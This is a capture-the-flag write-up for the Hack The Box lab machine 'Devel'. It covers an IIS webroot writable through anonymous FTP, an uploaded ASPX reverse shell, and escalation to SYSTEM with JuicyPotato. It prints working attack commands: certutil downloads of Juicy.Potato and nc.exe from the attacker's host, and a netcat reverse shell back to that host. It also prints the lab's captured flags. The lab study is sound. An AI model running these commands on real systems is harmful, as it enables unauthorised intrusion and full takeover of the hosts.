---
title: "Devel - Writeup"
linkTitle: "Devel"
weight: 15
featured: true
platform: "HTB"
name: "Devel"
os: "Windows"
difficulty: "Easy"
release: "04 Mar 2017"
ip: "10.129.30.84"
# Drop a real avatar at static/img/htb/devel.png and uncomment:
# avatar: "/img/htb/devel.png"
tags: ["windows", "ftp", "anonymous-login", "ms15-034", "iis", "aspx-reverse-shell", "seimpersonateprivilege", "juicypotato", "root-shell"]
description: "Easy Windows box. Anonymous FTP write access on an IIS webroot leads to an ASPX webshell, and SeImpersonatePrivilege closes the gap to SYSTEM via JuicyPotato."
---
{{< htb name="Devel" os="Windows" difficulty="Easy" release="04 Mar 2017" ip="10.129.30.84" platform="HTB" >}}

## Reconnaissance

```
(root㉿kali)# rustscan -a 10.129.30.84
```
```
Open 10.129.30.84:21
Open 10.129.30.84:80
```

```
(root㉿kali)# nmap 10.129.30.84 -p21,80 -sCV --script ftp-vuln*,http-vuln*
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
| http-vuln-cve2015-1635: 
|   VULNERABLE:
|   Remote Code Execution in HTTP.sys (MS15-034)
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows
```

Nmap's NSE scripts flag the box as vulnerable to MS15-034 (HTTP.sys RCE) right away, but with only FTP and IIS exposed, FTP is worth checking first.

## Enumeration

```
(root㉿kali)# ftp 10.129.30.84
```
```
Connected to 10.129.30.84.
220 Microsoft FTP Service
Name (10.129.30.84:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
```

```
ftp> ls
```
```
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
```

Anonymous FTP is not just readable — it's **writable**, and the FTP root maps directly onto the IIS webroot. Anything uploaded here becomes instantly reachable over HTTP.

## Initial Foothold

Grabbed the classic [aspx-reverse-shell](https://github.com/borjmz/aspx-reverse-shell), edited it with the attacker IP/port, and dropped it straight into the webroot over the same FTP session:

```
ftp> put shell.aspx
```

```
(root㉿kali)# rlwrap nc -lnvp 443
```
```
(root㉿kali)# curl http://10.129.30.84/shell.aspx
```
```
listening on [any] 443 ...
connect to [10.10.15.249] from (UNKNOWN) [10.129.30.84] 49203
```

A single `curl` request is enough to trigger it — IIS executes the ASPX page and the reverse shell fires back immediately.

## Privilege Escalation

```
c:\Users>whoami /all
```
```
User Name       SID
=============== ==============================================================
iis apppool\web S-1-5-82-2971860261-2701350812-2118117159-340795515-2183480550

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

`SeImpersonatePrivilege` is **Enabled** for the IIS app pool identity — the classic trigger for the "Potato family" of privilege escalation tools.

```
c:\Users>systeminfo
```
```
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
System Manufacturer:       VMware, Inc.
```

An unpatched Windows 7 box with no hotfixes installed and `SeImpersonatePrivilege` on tap — [JuicyPotato](https://github.com/ohpe/juicy-potato) is a direct path to SYSTEM.

```
c:\Users>certutil -urlcache -split -f http://10.10.15.249:8080/Juicy.Potato.x86.exe C:\Windows\Temp\Juicy.Potato.x86.exe
c:\Users>certutil -urlcache -split -f http://10.10.15.249:8080/nc.exe C:\Windows\Temp\nc.exe
```

```
(root㉿kali)# rlwrap nc -lnvp 4411
```

JuicyPotato coerces a privileged COM object (via a known CLSID) into authenticating locally as SYSTEM, then hijacks that token to spawn a process with full SYSTEM rights:

```
c:\Users>Juicy.Potato.x86.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe -e cmd.exe 10.10.15.249 4411" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```
```
listening on [any] 4411 ...
connect to [10.10.15.249] from (UNKNOWN) [10.129.30.84] 49203

C:\Windows\system32>whoami
nt authority\system
```

```
C:\Windows\system32> cat C:\Users\babis\Desktop\user.txt
```
```
26cce6baf1fc22e1ea417098d3a0128e
```

```
C:\Windows\system32> cat C:\Users\Administrator\Desktop\root.txt
```
```
ab18e7b8b9048f35e82e37484691abd7
```

## Lessons learned

- Nmap flagging a CVE doesn't mean it's the intended path — MS15-034 was a red herring here; anonymous FTP with write access was the actual way in.
- Anonymous FTP being *readable* is common and often boring; always check whether it's also **writable** before moving on, especially when the FTP root and web root look like they might overlap.
- `SeImpersonatePrivilege` enabled on a service account is one of the highest-value findings in a Windows `whoami /all` output — it almost always means Potato-family tools will get you to SYSTEM.
- On old, unpatched Windows boxes (Build 7600, no KBs installed), check for the simplest privesc first — a token-impersonation tool is far less noisy than chasing a kernel exploit.
